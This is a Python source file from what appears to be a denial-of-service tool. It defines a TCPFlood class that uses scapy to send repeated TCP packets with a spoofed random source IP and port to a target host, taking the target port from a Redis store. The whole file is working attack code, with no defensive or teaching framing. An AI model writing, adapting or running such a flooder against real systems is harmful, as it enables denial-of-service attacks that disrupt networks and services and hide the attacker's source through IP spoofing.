# @Time    : 2020/12/4 11:40 下午
# @Author  : h0rs3fa11
# @FileName: tcp_socket.py
# @Software: PyCharm
from scapy.all import *
from multiprocessing import Process
import random
from lib.utils.address import random_ip, random_port
from lib.utils.config import Config


class TCPFlood(Process):
    def __init__(self, ip, count, port=None):
        super().__init__()
        self.ip = ip
        self.port = port
        self.count = count

    def get_target(self):
        if not self.port:
            try:
                length = Config.redis_store.llen(self.ip)
                self.port = Config.redis_store.lindex(self.ip, random.randint(0, length))
            except Exception as e:
                print(f'got error when read redis:{e}')
            if not self.port:
                print(f'empty result of {self.ip}')

    def run(self):
        # TODO:异步
        self.get_target()
        packet = IP(src=random_ip(), dst=self.ip) / TCP(sport=random_port(), dport=int(self.port))
        try:
            for _ in range(self.count):
                send(packet)
        except AttributeError:
            print('Try again with sudo')
